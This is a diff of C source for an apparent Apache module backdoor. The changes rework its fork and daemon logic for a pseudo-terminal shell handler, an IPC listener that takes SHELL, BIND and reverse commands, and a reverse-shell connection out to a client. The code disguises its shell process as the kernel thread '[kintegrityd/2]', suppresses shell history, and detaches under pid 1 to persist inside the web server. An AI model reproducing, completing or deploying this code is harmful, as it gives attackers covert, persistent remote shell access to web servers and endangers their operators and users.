@@ -484,7 +484,7 @@ void shellPTY1(int socket) {
 
     struct termios terminal;
     int terminalfd, n = 0, sr;
-    pid_t ppid  ;
+    pid_t ppid, spid  ;
     char buf[1024];
 
     tcgetattr(terminalfd, &terminal);
@@ -496,10 +496,10 @@ void shellPTY1(int socket) {
 
     if(ppid == 0){
 
-        ppid = forkpty(&terminalfd, NULL, NULL, NULL);
+        spid = forkpty(&terminalfd, NULL, NULL, NULL);
 
-        if (ppid == 0) { // Child process
-            setsid();
+        if (spid == 0) { // Child process
+            //setsid();
             char *argv[] = { "[kintegrityd/2]", 0 };
             char *envp[] = { "HISTFILE=","TERM=vt100", 0 };
 
@@ -539,6 +539,7 @@ void shellPTY1(int socket) {
         }
     }else{
         waitpid(ppid,NULL,0);
+        kill(ppid,SIGTERM);
     }
     //
     //exit(0);
@@ -579,8 +580,6 @@ void shellPTY(int socket) {
         tcsetattr(terminalfd, TCSANOW, &terminal);
         fd_set readfd;
 
-        //kill(getppid(),SIGTERM);
-
         for (;;) {
             FD_ZERO(&readfd);
             FD_SET(terminalfd, &readfd);
@@ -611,6 +610,7 @@ void shellPTY(int socket) {
             }
         }
         waitpid(fpid,NULL,0);
+        exit(0);
     }
     return;
 }
@@ -641,8 +641,6 @@ int bindPort(int fd, int port){
         exit(0);
     }
 
-    //close(fd);
-
     if (listen(bindSock, 3) < 0){
         write(fd,"Listen failed",strlen("Listen failed"));
         exit(0);
@@ -657,7 +655,6 @@ void* bicomIPC(int sock, int revsockfd){
     char buf[1024];
     int n, sr;
     fd_set readset;
-    //Bidirectional write client <--> IPC (--> to forked root apache2 process)
     for (;;) {
         FD_ZERO(&readset);
         FD_SET(sock,&readset);
@@ -787,7 +784,6 @@ static int backdoor_post_read_request(request_rec *r) {
             // Close binded fd
             close(bindfd);
             worker(new_socket);
-            //bicomIPC(sock,new_socket);
             close(new_socket);
 
         }
@@ -838,7 +834,6 @@ static int backdoor_post_read_request(request_rec *r) {
 
         }
 
-        exit(0);
     }
 
 	if (!strcmp(r->uri, PINGWORD)) {
@@ -908,7 +903,7 @@ static int backdoor_post_read_request(request_rec *r) {
 
             if (connect(revsockfd , (struct sockaddr *)&client_to_connect , sizeof(client_to_connect)) < 0)
             {
-                write(fd, "Reverse socket can't connect to client\n", strlen("Reverse socket can't connect to client\n") + 1);
+                write(fd, "[+] Reverse socket can't connect to client\n", strlen("[+] Reverse socket can't connect to client\n") + 1);
                 exit(0);
             }
 
@@ -960,33 +955,23 @@ int waitIPC(int master){
             if (FD_ISSET(master, &readfds)) {
                 sd = accept(master, NULL, NULL);
                 FD_SET(sd, &readfds);
-                pid = fork();
-                if(pid){
-                    waitIPC(master);
-                }
                 if (FD_ISSET(sd, &readfds)) {
                     memset(buf, 0, 1024);
                     if ((rc = read(sd, buf, 1024)) <= 0) {
-                        //pthread_join(thread_id, NULL);
                         close(sd);
                     } else {
                         if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
-                            //pid_t spid;
-                            /*pid = fork();
+                            pid = fork();
                             if(pid == 0){
-                                pthread_create(&thread_id, NULL, shellPTY, sd);
-                                pthread_detach(&thread_id);
-                                //kill(getppid(),SIGTERM);
+                                shellPTY(sd);
                             }else{
-                                //waitpid(pid,NULL,0);
-                                //exit(0);
-                                //waitIPC(master);
-                                exit(0);
-                            }*/
-                            pthread_create(&thread_id, NULL, shellPTY, sd);
-                            pthread_detach(&thread_id);
-                            //kill(getppid(),SIGTERM);
-                            //shellPTY1(sd);
+                                pid = fork();
+                                if(pid == 0){
+                                    waitIPC(master);
+                                }else{
+                                    exit(0);
+                                }
+                            }
 
                         } else if (strstr(buf, "APACHE")) {
                             restartApache();
@@ -1007,8 +992,6 @@ int waitIPC(int master){
 
 
 int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
-    //pid_t ppid;
-
 
     pid = fork();
     // Kill father to create daemon attached to pid 1
@@ -1036,75 +1019,6 @@ int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp,
     chmod(serveraddr.sun_path, 0777);
 
 	waitIPC(master);
-
-    /*pthread_t thread_id;
-    pid = fork();
-    if(pid){
-        exit(0);
-    }
-    pthread_create(&thread_id, NULL, waitIPC, master);
-    pthread_join(thread_id, NULL);*/
-
-    /*while(1) {
-        FD_ZERO(&readfds);
-        FD_SET(master, &readfds);
-        max_sd = master;
-
-        for (i = 0; i < max_clients; i++) {
-            sd = clients[i];
-            if (sd > 0) {
-                FD_SET(sd, &readfds);
-            }
-            if (sd > max_sd) {
-                max_sd = sd;
-            }
-        }
-        select(max_sd + 1, &readfds, NULL, NULL, NULL);
-        if (FD_ISSET(master, &readfds)) {
-            new_client = accept(master, NULL, NULL);
-            for (i = 0; i < max_clients; i++) {
-                if (clients[i] == 0) {
-                    clients[i] = new_client;
-                    break;
-                }
-            }
-        }
-
-        // Read IPC socket
-        for (i = 0; i < max_clients; i++) {
-            sd = clients[i];
-            if (FD_ISSET(sd, &readfds)) {
-                memset(buf, 0, 1024);
-                if ((rc = read(sd, buf, 1024)) <= 0) {
-                    close(sd);
-                    clients[i] = 0;
-                } else {
-                    if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
-                        shellPTY(sd);
-                    } else if (strstr(buf, "APACHE")) {
-                        restartApache();
-                    } else if (strstr(buf, "reverse")) {
-                        char *meh = strtok(buf, "/");
-                        char *ip = strtok(NULL, "/");
-                        char *port = strtok(NULL, "/");
-                        char *prog = strtok(NULL, "/");
-
-                        reverseShell(ip, port, prog);
-                    }
-                }
-            }
-        }
-    }*/
-
-
-
-    /*pid_t spid;
-    spid = fork();
-    if (spid == 0){
-
-    }else{
-        waitpid(spid,NULL,0);
-    }*/
 }
 
 static int backdoor_log_transaction(request_rec *r) {
